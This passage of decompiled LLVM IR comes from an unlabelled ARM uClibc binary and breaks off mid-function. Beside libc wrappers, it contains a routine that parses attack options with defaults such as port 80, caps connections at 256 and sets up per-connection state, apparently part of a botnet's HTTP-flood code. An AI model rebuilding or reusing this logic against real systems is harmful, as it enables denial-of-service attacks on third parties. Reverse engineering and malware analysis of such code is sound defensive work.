define i32 @_getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen) local_unnamed_addr {
entry:
  %v9_8d68 = call i32 @getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen)
  ret i32 %v9_8d68
}

define i32* @___errno_location() local_unnamed_addr {
entry:
  %v4_8d74 = call i32* @__errno_location()
  ret i32* %v4_8d74
}

; Function Attrs: noreturn
define void @_exit(i32 %status) local_unnamed_addr #0 {
entry:
  call void @exit(i32 %status)
  unreachable
}

define i32 @_atoi(i8* %nptr) local_unnamed_addr {
entry:
  %v6_8d8c = call i32 @atoi(i8* %nptr)
  ret i32 %v6_8d8c
}

define i32 @_open(i8* %file, i32 %oflag, ...) local_unnamed_addr {
entry:
  %v7_8d98 = call i32 (i8*, i32, ...) @open(i8* %file, i32 %oflag)
  ret i32 %v7_8d98
}

define i32 @_clock() local_unnamed_addr {
entry:
  %v4_8da4 = call i32 @clock()
  ret i32 %v4_8da4
}

define i32 @_setsid() local_unnamed_addr {
entry:
  %v4_8db0 = call i32 @setsid()
  ret i32 %v4_8db0
}

define i32 @_closedir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8dbc = call i32 @closedir(%__dirstream* %dirp)
  ret i32 %v6_8dbc
}

define i32 @_fcntl(i32 %fd, i32 %cmd, ...) local_unnamed_addr {
entry:
  %v6_8dc8 = call i32 (i32, i32, ...) @fcntl(i32 %fd, i32 %cmd)
  ret i32 %v6_8dc8
}

define i32 @_close(i32 %fd) local_unnamed_addr {
entry:
  %v5_8dd4 = call i32 @close(i32 %fd)
  ret i32 %v5_8dd4
}

define i32 @_raise(i32 %sig) local_unnamed_addr {
entry:
  %v5_8de0 = call i32 @raise(i32 %sig)
  ret i32 %v5_8de0
}

define void @_free(i32* %ptr) local_unnamed_addr {
entry:
  call void @free(i32* %ptr)
  ret void
}

define i32 @_sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset) local_unnamed_addr {
entry:
  %v9_8df8 = call i32 @sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset)
  ret i32 %v9_8df8
}

define i32 @_getsockname(i32 %fd, %sockaddr* %addr, i32* %len) local_unnamed_addr {
entry:
  %v9_8e04 = call i32 @getsockname(i32 %fd, %sockaddr* %addr, i32* %len)
  ret i32 %v9_8e04
}

define i32 @function_8e08() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_8e08 = load i32, i32* @r4, align 4
  store i32 %v3_8e08, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1cd60.58 to i32), i32* %r5.global-to-local, align 4
  %v2_8e10 = load i8, i8* bitcast (i8** @global_var_1cd60.58 to i8*), align 4
  %v2_8e14 = icmp eq i8 %v2_8e10, 0
  br i1 %v2_8e14, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_8e18 = load i32, i32* @r0, align 4
  ret i32 %v12_8e18

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1cd44.61 to i32), i32* %r4.global-to-local, align 4
  %v2_8e20 = load i32, i32* bitcast (i32** @global_var_1cd44.61 to i32*), align 4
  store i32 %v2_8e20, i32* %r2.global-to-local, align 4
  %v2_8e28 = icmp eq i32 %v2_8e20, 0
  br i1 %v2_8e28, label %bb8, label %dec_label_pc_8e30

dec_label_pc_8e30:                                ; preds = %bb7, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge
  %v1_8e34 = phi i32 [ %v1_8e34.pre, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge ], [ ptrtoint (i32** @global_var_1cd44.61 to i32), %bb7 ]
  %v0_8e30 = phi i32 [ %v2_8e40, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge ], [ %v2_8e20, %bb7 ]
  %v1_8e30 = add i32 %v0_8e30, 4
  %v2_8e34 = inttoptr i32 %v1_8e34 to i32*
  store i32 %v1_8e30, i32* %v2_8e34, align 4
  %v0_8e3c = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8e3c)
  %v2_8e40 = load i32, i32* bitcast (i32** @global_var_1cd44.61 to i32*), align 4
  store i32 %v2_8e40, i32* %r2.global-to-local, align 4
  %v2_8e48 = icmp eq i32 %v2_8e40, 0
  br i1 %v2_8e48, label %.loopexit, label %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge

dec_label_pc_8e30.dec_label_pc_8e30_crit_edge:    ; preds = %dec_label_pc_8e30
  %v1_8e34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8e30

.loopexit:                                        ; preds = %dec_label_pc_8e30
  %v2_8e68.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8e68 = phi i32 [ %v2_8e68.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1cd60.58 to i32), %bb7 ]
  %v3_8e68 = inttoptr i32 %v2_8e68 to i8*
  store i8 1, i8* %v3_8e68, align 1
  %v2_8e6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8e6c, i32* %r4.global-to-local, align 4
  %v11_8e6c = load i32, i32* @r0, align 4
  ret i32 %v11_8e6c

; uselistorder directives
  uselistorder i32 %v2_8e40, { 1, 2, 0 }
  uselistorder i32** @global_var_1cd44.61, { 1, 0 }
  uselistorder i8** @global_var_1cd60.58, { 1, 0 }
  uselistorder label %dec_label_pc_8e30, { 1, 0 }
}

define i32 @function_8e7c(i32 %arg1, i16* %arg2) local_unnamed_addr {
dec_label_pc_8e7c:
  %v0_8e7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8e7c, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_8e7c
  %v1_8e7c = load i32, i32* @r4, align 4
  %v2_8e7c = trunc i32 %v1_8e7c to i16
  store i16 %v2_8e7c, i16* %arg2, align 2
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_8e7c, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_8e88() local_unnamed_addr {
.thread:
  %v2_8ea8 = load i32, i32* inttoptr (i32 117700 to i32*), align 4
  %v2_8eac = icmp eq i32 %v2_8ea8, 0
  br i1 %v2_8eac, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 117700

bb2:                                              ; preds = %.thread
  ret i32 117700

; uselistorder directives
  uselistorder i32 117700, { 1, 0, 2 }
}

define i32 @function_8ee0() local_unnamed_addr {
dec_label_pc_8ee0:
  %v5_8ee4 = load i32, i32* @r0, align 4
  ret i32 %v5_8ee4
}

define i32 @__start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8ef0 = ptrtoint i32* %stack_var_4 to i32
  %v7_8f10 = call i32 @___uClibc_main(i32 ptrtoint (i32* @global_var_101d8.73 to i32), i32 %arg2, i32 %v4_8ef0, i32 35692, i32 82784, i32 %arg1, i32 %v4_8ef0)
  %v1_8f14 = call i32 @_abort(i32 %v7_8f10)
  ret i32 %v1_8f14
}

define i32 @function_8f24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8f24:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-10568 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-20809 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_8f24 = load i32, i32* @r4, align 4
  store i32 %v3_8f24, i32* %stack_var_-36, align 4
  %v6_8f24 = load i32, i32* @r5, align 4
  %v9_8f24 = load i32, i32* @r6, align 4
  %v15_8f24 = load i32, i32* @r8, align 4
  %v1_8f30 = urem i32 %arg3, 256
  store i32 %v1_8f30, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_8f3c = urem i32 %arg1, 256
  store i32 %v1_8f3c, i32* %ip.global-to-local, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v1_8f30, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_8f58 = inttoptr i32 %arg4 to i32*
  %v6_8f58 = call i32 @function_acdc(i32 %v1_8f30, i32* %v5_8f58, i32 21, i32 0, i32 %arg2)
  %v0_8f5c = load i32, i32* @r5, align 4
  store i32 %v0_8f5c, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r4, align 4
  store i32 %v0_8f68, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_143b4.76 to i32), i32* %r3.global-to-local, align 4
  %v6_8f70 = inttoptr i32 %v0_8f5c to i32*
  %v7_8f70 = call i32 @function_acdc(i32 %v0_8f68, i32* %v6_8f70, i32 20, i32 ptrtoint ([4 x i8]* @global_var_143b4.76 to i32), i32 %v6_8f58)
  %v0_8f74 = load i32, i32* @r5, align 4
  store i32 %v0_8f74, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8f70, i32* %fp.global-to-local, align 4
  %v0_8f84 = load i32, i32* @r4, align 4
  store i32 %v0_8f84, i32* %r0.global-to-local, align 4
  %v5_8f88 = inttoptr i32 %v0_8f74 to i32*
  %v6_8f88 = call i32 @function_acdc(i32 %v0_8f84, i32* %v5_8f88, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8f8c = load i32, i32* @r5, align 4
  store i32 %v0_8f8c, i32* %r1.global-to-local, align 4
  store i32 %v6_8f88, i32* %sb.global-to-local, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143b8.78 to i32), i32* %r3.global-to-local, align 4
  %v5_8fa0 = inttoptr i32 %v0_8f8c to i32*
  %v6_8fa0 = call i32 @function_acdc(i32 %v0_8f98, i32* %v5_8fa0, i32 22, i32 ptrtoint (i32* @global_var_143b8.78 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8fa4 = load i32, i32* @r5, align 4
  store i32 %v0_8fa4, i32* %r1.global-to-local, align 4
  store i32 %v6_8fa0, i32* @sl, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8fb0 = load i32, i32* @r4, align 4
  store i32 %v0_8fb0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8fb8 = inttoptr i32 %v0_8fa4 to i32*
  %v5_8fb8 = call i32 @function_b240(i32 %v0_8fb0, i32* %v4_8fb8, i32 24, i32 1)
  %v0_8fbc = load i32, i32* @r5, align 4
  store i32 %v0_8fbc, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8fb8, i32* @r6, align 4
  %v0_8fcc = load i32, i32* @r4, align 4
  store i32 %v0_8fcc, i32* %r0.global-to-local, align 4
  %v4_8fd0 = inttoptr i32 %v0_8fbc to i32*
  %v5_8fd0 = call i32 @function_b240(i32 %v0_8fcc, i32* %v4_8fd0, i32 7, i32 80)
  %v2_8fd8 = ptrtoint i32* %stack_var_-20809 to i32
  %v3_8fe0 = mul i32 %v5_8fd0, 65536
  store i32 %v3_8fe0, i32* %r3.global-to-local, align 4
  %tmp199 = bitcast i32* %stack_var_-20809 to i8*
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8ff4 = urem i32 %v5_8fd0, 65536
  store i32 %v3_8ff4, i32* %r8.global-to-local, align 4
  %v4_8ff8 = call i32* @memset(i32* nonnull %stack_var_-20809, i32 0, i32 10241)
  %v6_8ff8 = ptrtoint i32* %v4_8ff8 to i32
  store i32 %v6_8ff8, i32* %r0.global-to-local, align 4
  %v0_8ffc = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8ffc = icmp slt i32 %v0_8ffc, 0
  store i1 %v1_8ffc, i1* %cpsr_n.global-to-local, align 1
  %v2_8ffc = icmp eq i32 %v0_8ffc, 0
  store i1 %v2_8ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8ffc, label %.thread13, label %bb

bb:                                               ; preds = %dec_label_pc_8f24
  %v1_9000 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_9000 = icmp slt i32 %v1_9000, 0
  store i1 %v2_9000, i1* %cpsr_n.global-to-local, align 1
  %v3_9000 = icmp eq i32 %v1_9000, 0
  store i1 %v3_9000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9000, label %bb200, label %dec_label_pc_901c

.thread13:                                        ; preds = %dec_label_pc_8f24
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9010

bb200:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9010

dec_label_pc_9010:                                ; preds = %bb200, %dec_label_pc_903c, %.thread13, %dec_label_pc_902c, %dec_label_pc_901c
  %v29_9018 = phi i32 [ %v2_9040, %dec_label_pc_903c ], [ %v6_8ff8, %.thread13 ], [ %v6_8ff8, %bb200 ], [ %v2_9030, %dec_label_pc_902c ], [ %v2_9020, %dec_label_pc_901c ]
  %v2_9018 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_9018, i32* %r4.global-to-local, align 4
  store i32 %v6_8f24, i32* %r5.global-to-local, align 4
  store i32 %v9_8f24, i32* %r6.global-to-local, align 4
  store i32 %v15_8f24, i32* %r8.global-to-local, align 4
  ret i32 %v29_9018

dec_label_pc_901c:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_8ffc, i32* %r0.global-to-local, align 4
  %v1_9020 = inttoptr i32 %v0_8ffc to i8*
  %v2_9020 = call i32 @function_13a54(i8* %v1_9020)
  store i32 %v2_9020, i32* %r0.global-to-local, align 4
  %v1_9024 = add i32 %v2_9020, -255
  %v2_9024 = icmp ugt i32 %v2_9020, 254
  store i1 %v2_9024, i1* %cpsr_c.global-to-local, align 1
  %v3_9024 = sub i32 254, %v2_9020
  %v4_9024 = and i32 %v3_9024, %v2_9020
  %v5_9024 = icmp slt i32 %v4_9024, 0
  store i1 %v5_9024, i1* %cpsr_v.global-to-local, align 1
  %v6_9024 = icmp slt i32 %v1_9024, 0
  store i1 %v6_9024, i1* %cpsr_n.global-to-local, align 1
  %v7_9024 = icmp eq i32 %v2_9020, 255
  store i1 %v7_9024, i1* %cpsr_z.global-to-local, align 1
  %v8_9028 = icmp sgt i32 %v2_9020, 255
  br i1 %v8_9028, label %dec_label_pc_9010, label %dec_label_pc_902c

dec_label_pc_902c:                                ; preds = %dec_label_pc_901c
  %v0_902c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_902c, i32* %r0.global-to-local, align 4
  %v1_9030 = inttoptr i32 %v0_902c to i8*
  %v2_9030 = call i32 @function_13a54(i8* %v1_9030)
  store i32 %v2_9030, i32* %r0.global-to-local, align 4
  %v1_9034 = add i32 %v2_9030, -127
  %v2_9034 = icmp ugt i32 %v2_9030, 126
  store i1 %v2_9034, i1* %cpsr_c.global-to-local, align 1
  %v3_9034 = sub i32 126, %v2_9030
  %v4_9034 = and i32 %v3_9034, %v2_9030
  %v5_9034 = icmp slt i32 %v4_9034, 0
  store i1 %v5_9034, i1* %cpsr_v.global-to-local, align 1
  %v6_9034 = icmp slt i32 %v1_9034, 0
  store i1 %v6_9034, i1* %cpsr_n.global-to-local, align 1
  %v7_9034 = icmp eq i32 %v2_9030, 127
  store i1 %v7_9034, i1* %cpsr_z.global-to-local, align 1
  %v8_9038 = icmp sgt i32 %v2_9030, 127
  br i1 %v8_9038, label %dec_label_pc_9010, label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_902c
  %v0_903c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_903c, i32* %r0.global-to-local, align 4
  %v1_9040 = inttoptr i32 %v0_903c to i8*
  %v2_9040 = call i32 @function_13a54(i8* %v1_9040)
  store i32 %v2_9040, i32* %r0.global-to-local, align 4
  %v1_9044 = add i32 %v2_9040, -9
  %v2_9044 = icmp ugt i32 %v2_9040, 8
  store i1 %v2_9044, i1* %cpsr_c.global-to-local, align 1
  %v3_9044 = sub i32 8, %v2_9040
  %v4_9044 = and i32 %v3_9044, %v2_9040
  %v5_9044 = icmp slt i32 %v4_9044, 0
  store i1 %v5_9044, i1* %cpsr_v.global-to-local, align 1
  %v6_9044 = icmp slt i32 %v1_9044, 0
  store i1 %v6_9044, i1* %cpsr_n.global-to-local, align 1
  %v7_9044 = icmp eq i32 %v2_9040, 9
  store i1 %v7_9044, i1* %cpsr_z.global-to-local, align 1
  %v7_9048 = icmp sgt i32 %v2_9040, 9
  br i1 %v7_9048, label %dec_label_pc_9010, label %bb201

bb201:                                            ; preds = %dec_label_pc_903c
  %v10_9048 = ptrtoint i32* %stack_var_-404 to i32
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v8_904c = load i32, i32* @r4, align 4
  %v10_904c = add i32 %v10_9048, 364
  %v11_904c = inttoptr i32 %v10_904c to i32*
  store i32 %v8_904c, i32* %v11_904c, align 4
  br label %dec_label_pc_9054

dec_label_pc_9054:                                ; preds = %bb201, %bb205
  %v0_9054 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9054, i32* %r0.global-to-local, align 4
  %v1_9058 = inttoptr i32 %v0_9054 to i8*
  %v2_9058 = call i32 @function_13a54(i8* %v1_9058)
  store i32 %v2_9058, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9060 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9060, i32* %ip.global-to-local, align 4
  %v2_9064 = sub i32 %v2_9058, %v3_9060
  %v3_9064 = icmp uge i32 %v2_9058, %v3_9060
  store i1 %v3_9064, i1* %cpsr_c.global-to-local, align 1
  %v4_9064 = xor i32 %v3_9060, %v2_9058
  %v5_9064 = xor i32 %v2_9064, %v2_9058
  %v6_9064 = and i32 %v5_9064, %v4_9064
  %v7_9064 = icmp slt i32 %v6_9064, 0
  store i1 %v7_9064, i1* %cpsr_v.global-to-local, align 1
  %v8_9064 = icmp slt i32 %v2_9064, 0
  store i1 %v8_9064, i1* %cpsr_n.global-to-local, align 1
  %v9_9064 = icmp eq i32 %v2_9058, %v3_9060
  store i1 %v9_9064, i1* %cpsr_z.global-to-local, align 1
  %v7_9068 = icmp sgt i32 %v2_9058, %v3_9060
  br i1 %v7_9068, label %dec_label_pc_906c, label %dec_label_pc_9098

dec_label_pc_906c:                                ; preds = %dec_label_pc_9054
  %v0_906c = load i32, i32* %fp.global-to-local, align 4
  %v2_906c = add i32 %v0_906c, %v3_9060
  %v3_906c = inttoptr i32 %v2_906c to i8*
  %v4_906c = load i8, i8* %v3_906c, align 1
  %v6_906c = zext i8 %v4_906c to i32
  %v1_9070 = add nsw i32 %v6_906c, -32
  store i32 %v1_9070, i32* %r2.global-to-local, align 4
  %v1_9074 = add nsw i32 %v6_906c, -97
  store i32 %v1_9074, i32* %r3.global-to-local, align 4
  %v2_9078 = icmp ugt i32 %v1_9074, 24
  store i1 %v2_9078, i1* %cpsr_c.global-to-local, align 1
  %v3_9078 = sub nsw i32 121, %v6_906c
  %v4_9078 = and i32 %v3_9078, %v1_9074
  %v5_9078 = icmp slt i32 %v4_9078, 0
  store i1 %v5_9078, i1* %cpsr_v.global-to-local, align 1
  %v6_9078 = icmp ult i8 %v4_906c, 122
  store i1 %v6_9078, i1* %cpsr_n.global-to-local, align 1
  %v7_9078 = icmp eq i32 %v1_9074, 25
  store i1 %v7_9078, i1* %cpsr_z.global-to-local, align 1
  %v2_907c = xor i1 %v2_9078, true
  %v3_907c = or i1 %v7_9078, %v2_907c
  br i1 %v3_907c, label %bb202, label %bb203

bb202:                                            ; preds = %dec_label_pc_906c
  %v5_907c = trunc i32 %v1_9070 to i8
  store i8 %v5_907c, i8* %v3_906c, align 1
  %v0_9080.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_9080.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_906c, %bb202
  %v1_9084 = phi i1 [ %v2_9078, %dec_label_pc_906c ], [ %v1_9080.pre, %bb202 ]
  %v0_9084 = phi i1 [ false, %dec_label_pc_906c ], [ %v0_9080.pre, %bb202 ]
  %v2_9080 = xor i1 %v1_9084, true
  %v3_9080 = or i1 %v0_9084, %v2_9080
  br i1 %v3_9080, label %bb204, label %._crit_edge

._crit_edge:                                      ; preds = %bb203
  %v0_908c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb205

bb204:                                            ; preds = %bb203
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v7_9084 = load i32, i32* %v11_904c, align 4
  store i32 %v7_9084, i32* %ip.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %._crit_edge, %bb204
  %v0_908c = phi i32 [ %v0_908c.pre, %._crit_edge ], [ %v7_9084, %bb204 ]
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v1_908c = add i32 %v0_908c, 1
  store i32 %v1_908c, i32* %ip.global-to-local, align 4
  store i32 %v1_908c, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9054

dec_label_pc_9098:                                ; preds = %dec_label_pc_9054
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_909c = call i32 @function_13128(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_90a4 = call i32 @function_13128(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_90ac = call i32 @function_13128(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_90b4 = call i32 @function_13128(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_90bc = call i32 @function_13128(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_90c4 = call i32 @function_13128(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_90cc = call i32 @function_13128(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_90d4 = call i32 @function_13128(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_90dc = call i32 @function_13128(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_90e4 = call i32 @function_13128(i32 45)
  store i32 %v1_90e4, i32* %r0.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r6, align 4
  %v2_90e8 = add i32 %v0_90e8, -256
  %v3_90e8 = icmp ugt i32 %v0_90e8, 255
  store i1 %v3_90e8, i1* %cpsr_c.global-to-local, align 1
  %v4_90e8 = sub i32 255, %v0_90e8
  %v5_90e8 = and i32 %v4_90e8, %v0_90e8
  %v6_90e8 = icmp slt i32 %v5_90e8, 0
  store i1 %v6_90e8, i1* %cpsr_v.global-to-local, align 1
  %v7_90e8 = icmp slt i32 %v2_90e8, 0
  store i1 %v7_90e8, i1* %cpsr_n.global-to-local, align 1
  %v8_90e8 = icmp eq i32 %v0_90e8, 256
  store i1 %v8_90e8, i1* %cpsr_z.global-to-local, align 1
  %v5_90ec = icmp slt i32 %v0_90e8, 256
  br i1 %v5_90ec, label %thread-pre-split, label %bb206

bb206:                                            ; preds = %dec_label_pc_9098
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_9098, %bb206
  %v0_90f4 = phi i32 [ 256, %bb206 ], [ %v0_90e8, %dec_label_pc_9098 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_90f8 = call i32 @function_13128(i32 46)
  store i32 %v0_90f4, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_9108 = call i32 @_calloc(i32 %v0_90f4, i32 3140)
  store i32 %v2_9108, i32* %r0.global-to-local, align 4
  store i32 %v0_90f4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9110 = icmp slt i32 %v0_90f4, 0
  store i1 %v1_9110, i1* %cpsr_n.global-to-local, align 1
  %v2_9110 = icmp eq i32 %v0_90f4, 0
  store i1 %v2_9110, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9108, i32* @r5, align 4
  %tmp207 = icmp slt i32 %v0_90f4, 1
  br i1 %tmp207, label %dec_label_pc_924c, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %thread-pre-split
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_9124

dec_label_pc_9124:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_9120
  %v1_9130 = phi i32 [ %v1_abe4, %dec_label_pc_abc8 ], [ %v2_9108, %dec_label_pc_9120 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %v1_8f3c, i32* %r1.global-to-local, align 4
  %v2_9130 = inttoptr i32 %v1_9130 to i32*
  store i32 -1, i32* %v2_9130, align 4
  %v0_9134 = load i32, i32* %r3.global-to-local, align 4
  %v1_9134 = trunc i32 %v0_9134 to i8
  %v2_9134 = load i32, i32* @r5, align 4
  %v3_9134 = add i32 %v2_9134, 4
  %v4_9134 = inttoptr i32 %v3_9134 to i8*
  store i8 %v1_9134, i8* %v4_9134, align 1
  %v0_9138 = load i32, i32* @r7, align 4
  %v1_913c = load i32, i32* %r1.global-to-local, align 4
  %v2_913c = srem i32 %v0_9138, %v1_913c
  store i32 %v2_913c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_9148 = and i32 %v2_913c, 536870912
  %v3_9148 = icmp ne i32 %v2_9148, 0
  store i1 %v3_9148, i1* %cpsr_c.global-to-local, align 1
  %v5_9148 = mul i32 %v2_913c, 24
  store i32 %v5_9148, i32* %r3.global-to-local, align 4
  %v2_914c = add i32 %v5_9148, %arg2
  store i32 %v2_914c, i32* @r6, align 4
  %v1_9150 = add i32 %v2_914c, 16
  %v2_9150 = inttoptr i32 %v1_9150 to i32*
  %v3_9150 = load i32, i32* %v2_9150, align 4
  store i32 %v3_9150, i32* %r2.global-to-local, align 4
  %v0_9154 = load i32, i32* @r5, align 4
  %v1_9154 = add i32 %v0_9154, 532
  store i32 %v1_9154, i32* %lr.global-to-local, align 4
  store i32 %v1_9154, i32* @r0, align 4
  %v0_915c = load i32, i32* @sl, align 4
  store i32 %v0_915c, i32* %r1.global-to-local, align 4
  %v2_9160 = add i32 %v0_9154, 16
  %v3_9160 = inttoptr i32 %v2_9160 to i32*
  store i32 %v3_9150, i32* %v3_9160, align 4
  %v0_9164 = load i32, i32* %lr.global-to-local, align 4
  %v2_9168 = inttoptr i32 %v1_9154 to i8*
  %v3_9168 = call i32 @function_13a7c(i8* %v2_9168, i32 %v0_915c)
  store i32 %v3_9168, i32* %r0.global-to-local, align 4
  %v0_916c = load i32, i32* @r5, align 4
  %v1_916c = add i32 %v0_916c, 532
  %v2_916c = inttoptr i32 %v1_916c to i8*
  %v3_916c = load i8, i8* %v2_916c, align 1
  %v4_916c = zext i8 %v3_916c to i32
  store i32 %v4_916c, i32* %r3.global-to-local, align 4
  %v2_9170 = icmp ugt i8 %v3_916c, 46
  store i1 %v2_9170, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9170 = icmp ult i8 %v3_916c, 47
  store i1 %v6_9170, i1* %cpsr_n.global-to-local, align 1
  %v7_9170 = icmp eq i8 %v3_916c, 47
  store i1 %v7_9170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9170, label %dec_label_pc_919c, label %dec_label_pc_9178

dec_label_pc_9178:                                ; preds = %dec_label_pc_9124
  store i32 %v0_9164, i32* %r0.global-to-local, align 4
  %v1_917c = inttoptr i32 %v0_9164 to i8*
  %v2_917c = call i32 @function_13a54(i8* %v1_917c)
